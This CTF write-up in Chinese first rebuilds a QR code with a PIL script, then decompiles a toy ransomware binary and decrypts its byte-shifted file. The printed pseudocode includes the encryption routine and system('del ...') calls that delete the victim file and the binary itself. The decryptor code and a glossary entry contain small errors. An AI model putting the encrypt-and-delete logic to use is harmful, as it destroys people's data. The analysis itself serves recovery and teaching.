只分黑白的成为二值图片，此处的01序列并非某张图片的字节数据，而是二值图的内容，将其整理成384*24的尺寸即可获得小半张二维码....网上只有用PIL将图片二值化的过程，没有逆过程，可能还是需要自己学习了PIL以后才能做到。因此选择直接将二值图放到txt中缩放各种尺寸，最后发现了半张二维码。

其实这里的尺寸不对，题目里提示：'二向箔的斑马'=>'二维马'（什么冷笑话）。考虑到二维码多为方形的，总像素点是9216=96^2，所以如果真是二维码应该是96*96的。

#### Python图像处理

我没想到一道题能让我血压高两次...国内这个互联网环境真是抽象啊，为什么我找一个图像处理包的教程，几乎没有一个告诉我如何操作像素颜色的啊...真的很离谱，其中还有几个假文档...简单搜罗了很久很久很久，终于写出以下脚本用于还原二维码：

```python
from PIL import Image

img=Image.new('1',(96,96),1)
img_arr=img.load()
f=open('./res.txt');
for i in range(96):
    for j in range(96):
        s=f.read(1);
        if s=='0':
            img_arr[i,j]=0;
            
f.close();
img.save('./233.jpg')
```

简单整理一下相关知识点：

1. 用的是python3的Pillow包，一个图像处理包，python3的官方文档里莫得它，而且找不到完整的教程也找不到它自己的文档...（这应该是我自己的问题）

2. 引入PIL包中的Image类，然后用 `new(mode,size,color)` 新建一张纯色图片，由于模式选的是'1'（必须有引号），所以是单色，颜色直接填写1即可，0是黑色，1是白色，而尺寸自然是96*96。

3. python中不需要任何包调用即可使用函数 `open(str,mode)` 打开文件，默认不加参数至少可以读... `r` 读方式打开，若文件不存在则报错；`w` 以写方式打开，文件存在则清空，不存在则创建；`b` 以二进制模式打开；`r+` 或 `w+` 以读写方式打开。最后别忘了关闭文件。

4. 用 `file.read(size)` 函数读取指定个数的内容，并且指针向后推移。

5. `type(s)` 返回s的类型；`range(95)` 返回0-94的所有整数，`range(3,5,2)` 只返回3，因为步长是2，而5是取不到的，该函数返回的实际上是一个整数列表；

6. 用 `Image.load()` 函数加载对象的像素，可以用 `[a,b]` 访问a+1行b+1列的像素并修改它的值。

7. 用函数 `.save(location)` 存储图片到指定位置。 

8. 还有一个在很多教程都提到的 `lambda` ，用于快速创建一个函数：

   ```python
   g = lambda x:x+1 #求x+1
   ```

   

还原后得到一张二维码：

![](http://picturebed-1310517892.file.myqcloud.com/2022/202205101539739.jpg)

扫描后得到flag。

还有一篇用PIL将图片二值化的资料：[使用PIL库获取图片的二进制/01文本](https://blog.csdn.net/weixin_45755831/article/details/122004205)

**参考：[**

[木头人-图像处理 Pillow库](https://zhuanlan.zhihu.com/p/58671158)

[没有Pillow包的中文Python3104文档](https://docs.python.org/zh-cn/3/)

[Python的碎片-Python Pillow库的用法介绍](https://blog.csdn.net/weixin_43790276/article/details/108478270)

[Python中lambda的用法](https://blog.csdn.net/qq_40089648/article/details/89022804)

[欢天喜地小姐姐-range()函数用法](https://blog.csdn.net/qq_41496108/article/details/108680912)

[XerCis-Python PIL和二进制图片互转](https://blog.csdn.net/lly1122334/article/details/108218530)

[Hurri_cane-Python中字节Byte数据与列表、十六进制转换](https://blog.csdn.net/ShakalakaPHD/article/details/117729550)

[嶙羽-Python中StringIO和BytesIO](https://www.cnblogs.com/yqpy/p/8556090.html)

[山山而川'-Python 文件打开读取写入方式](https://blog.csdn.net/qq_44159028/article/details/120388405)

[pillow小文档](https://www.osgeo.cn/pillow/handbook/index.html)

**]**



### 骗！偷袭！勒索绑架！【任务A：数据恢复】

题目给了两份文件，一份是"WannaEscape.exe"，也就是病毒程序，一份是"required_essay.txt.WannaEscape"。将exe程序拖进ida，在左侧找到main函数，然后F5恢复一下伪代码（这应该是C语言？）：

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  unsigned __int8 buf[1024]; // [rsp+20h] [rbp-60h] BYREF
  unsigned __int8 c; // [rsp+42Fh] [rbp+3AFh]
  size_t bufsz; // [rsp+430h] [rbp+3B0h]
  FILE *fout; // [rsp+438h] [rbp+3B8h]
  FILE *fin; // [rsp+440h] [rbp+3C0h]
  size_t i; // [rsp+448h] [rbp+3C8h]

  _main(argc, argv, envp);
  fin = fopen("required_essay.txt", "rb");
  fout = fopen("required_essay.txt.WannaEscape", "wb");
  if ( fin && fout )
  {
    for ( bufsz = 0i64; ; fwrite(buf, 1ui64, bufsz, fout) )
    {
      bufsz = fread(buf, 1ui64, 0x400ui64, fin);// 1024个一字节数据
      if ( !bufsz )
        break;
      for ( i = 0i64; i < bufsz; ++i )
      {
        c = buf[i];
        c += (i & 0xF) + 127;
        buf[i] = c;
      }
    }
    fclose(fin);
    fclose(fout);
    system("del required_essay.txt");
    system("del WannaEscape.exe");
    result = 0;
  }
  else
  {
    if ( fin )
      fclose(fin);
    if ( fout )
      fclose(fout);
    result = 1;
  }
  return result;
}
```

简单浏览一下程序的功能：读入"required_essay.txt"文本（这就是我们要恢复英语大作业）的数据，再打开"required_essay.txt.WannaEscape"用于写入数据，然后每次读入1024个1字节大小的数据到buf指针中（这里它的定义是"unsigned _int8"可能是指占8位的整数类型，因为用他存储的是一字节大小的数据），然后做一个简单的运算，然后输出到文件"required_essay.txt.WannaEscape"中，因此这就是个经过恶意处理的备份论文。

`fopen()` 应该是C语言中的打开文件函数，第二项参数是打开模式，`size_t fwrite(const void * buffer, size_t size, size_t count, FILE * stream)` 会从buffer中读取count个size字节大小数据写入到文件流中，`fread()` 类似，不过它会返回读取的数据大小；`0i64` 的写法表示的是int64类型的数值0，`1ui64` 类似。

`i & 0xF` 是将i的最后四位保留，其他全部置0，得到的数值再加上127，加到原论文的字节值中，但其实不用计算具体数值，因为它只由迭代的i决定，恢复的时候直接剪掉即可。最后调用 `system()` 函数删除原论文文件和病毒文件本身。因为本地是没有原论文文件的，所以文件会打开失败导致循环不执行，这两条删除语句是执行不到的，但是由于"required_essay.txt.WannaEscape"被用于输出打开过，会被直接置空，所以如果在本地运行该程序，会出现没发生任何事但是论文备份却变空的情况。接下来用C++恢复原论文：

```c++
#include <iostream>
#include <string>
#include <fstream>

using namespace std;

int main(){
  fstream fin,fout;
  fin.open("required_essay.txt.WannaEscape",ios::binary|ios::in);
  fout.open("essay.txt",ios::binary|ios::out);
  char s[1024],c;

  while(fin.read(s,1024)){
    int readBytes=fin.gcount();
    for(int i=0;i<readBytes;i++){
      c=s[i];
      c-=(i & 0xF)+127;
      s[i]=c;
    }
    fout.write(s,readBytes);
  }
  
  fin.close();
  fout.close();
  return 1;

}
```

其实C++也可以采用 `fopen()` 等函数，这一类都在 `cstdio` 文件头中；这里用的是文件流，由于是一个字节一个字节的存，所以声明 `char` 类型的变量，这里不能用 `char *s` ，因为s最多存八个字节的内容（我也不知道为什么），只能声明一个 `char s[1024]` ；

地址范围：

```
1C09H:4096+12*256+0+9=7177字节
```

然后由于文件大小并非1024的整数倍，所以要记录读取的字节数用于迭代 `int readBytes=fin.gcount()` ；恢复后得到一篇没什么用的英语论文，里面藏着一串flag：`r00t{50-l0n6-4nd-7h4nk5-f0r-4ll-7h3-f15h}`  

**参考:[**

[学校慕课课程的C++资料（挺好用的）](https://www.icourse163.org/spoc/learn/DHU-1464535194?tid=1465433514#/learn/content?type=detail&id=1245608367)

[C++ fopen()](https://blog.csdn.net/xiaoxxcool/article/details/2460110)

[C++ fread()](https://vimsky.com/examples/usage/fread-function-in-c.html)

[__int64](https://www.cnblogs.com/joeblackzqq/archive/2011/02/15/1955440.html)

[C++ fwrite()用法](https://vimsky.com/examples/usage/cpp-programming_library-function_cstdio_fwrite.html)

**]**



**英文手册**

```
captcha:验证码
immutable:不可变的
ciphertext:密文
Disk:磁盘
Memory:内存
kernel:内河
heap:堆
canary:Linux系统cookie
bypass:绕过
```